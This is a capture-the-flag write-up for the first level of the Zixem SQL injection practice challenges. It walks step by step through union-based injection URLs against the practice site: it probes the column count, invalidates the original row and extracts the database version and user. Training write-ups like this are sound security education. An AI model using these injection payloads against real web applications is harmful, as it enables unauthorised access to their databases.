# Rules!
- Use only **UNION** BASED!
- Your mission is to select only the **version()** & **user()**.
- **Have Fun** (:

# Reference Table:
- [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
- [Level 2](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-2)
- [Level 3](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-3)
- [Level 4](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-4)
- [Level 5](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-5)
- [Level 6](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-6)
- [Level 7](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-7)
- [Level 8](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-8)
- [Level 9](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-9)

## [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
Start: `[https://zixem.altervista.org/SQLi/level1.php?id=1](https://zixem.altervista.org/SQLi/level1.php?id=1)`  
> - **Item ID:** 1
> - **Price:** 20$

=> I guess the Query can be:  
`SELECT * FROM <db> WHERE id=1`
=> We should add `UNION SELECT 1,2;--`  

###### Result: ######  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2;--`
> - The used SELECT statements have a different number of columns **Item ID:**
> - **Price:** $

=> So it doesn't have 2 columns, let's try again with more to see if the error still exist.  

###### Result: ######  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2,3;--`
> - **Item ID:** 1
> - **Price:** 20$

=> But the Data is not shown in the result. It is caused of the "id=1" data came before our data, let's **invalidate** it first.  

###### Result: ######  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3;--`
> - **Item ID:** 2
> - **Price:** 1$

Ok let's extract *version()* and *user()*:  

###### Result: ######  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%20version(),user(),3;--`
> - **Item ID:** zixem@localhost
> - **Price:** 5.6.33-log$

**Bazinga!**  
###### END ######  
